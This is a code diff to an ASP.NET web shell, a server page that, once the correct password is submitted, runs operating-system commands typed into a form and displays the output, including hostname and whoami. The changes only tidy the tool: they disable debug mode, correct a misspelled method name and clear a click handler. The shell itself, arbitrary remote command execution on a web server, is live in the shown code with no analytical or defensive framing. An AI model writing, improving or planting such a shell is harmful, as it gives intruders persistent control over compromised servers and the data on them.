@@ -1,4 +1,4 @@
-<%@ Page Language="C#" Debug="true" Trace="false" %>
+<%@ Page Language="C#" Debug="false" Trace="false" %>
 <%@ Import Namespace="System.Diagnostics" %>
 <%@ Import Namespace="System.IO" %>
 <script Language="c#" runat="server">
@@ -18,7 +18,7 @@
         CommandTextbox.Value = Request.Form["CommandTextbox"];
     }
 
-    string ExcuteCommand(string arg)
+    string ExecuteCommand(string arg)
     {
         if (arg.Length >= 1)
         {
@@ -40,11 +40,11 @@
     {
         if (Request.Form["PasswordTextbox"] == Password) 
         {
-            string h = Server.HtmlEncode(ExcuteCommand("hostname")).Trim();
-            string u = Server.HtmlEncode(ExcuteCommand("whoami")).Trim();
+            string h = Server.HtmlEncode(ExecuteCommand("hostname")).Trim();
+            string u = Server.HtmlEncode(ExecuteCommand("whoami")).Trim();
 
             Hostname.Text = u + "@" + h;
-            CommandOutput.InnerHtml = Server.HtmlEncode(ExcuteCommand(Request.Form["CommandTextbox"]));
+            CommandOutput.InnerHtml = Server.HtmlEncode(ExecuteCommand(Request.Form["CommandTextbox"]));
         }
         else 
         {
@@ -89,7 +89,7 @@
                     <asp:Label id="Hostname" runat='server'></asp:Label>
                 </td>
                 <td width="60%">
-                    <input type=text id="CommandTextbox" runat="server" value='' onClick="this.select();" style="width:80%" onkeydown="if (event.keyCode == 13) { this.form.submit(); return false; }"/>
+                    <input type=text id="CommandTextbox" runat="server" value='' onClick="" style="width:80%" onkeydown="if (event.keyCode == 13) { this.form.submit(); return false; }"/>
                 </td>
             </tr>
             <tr>
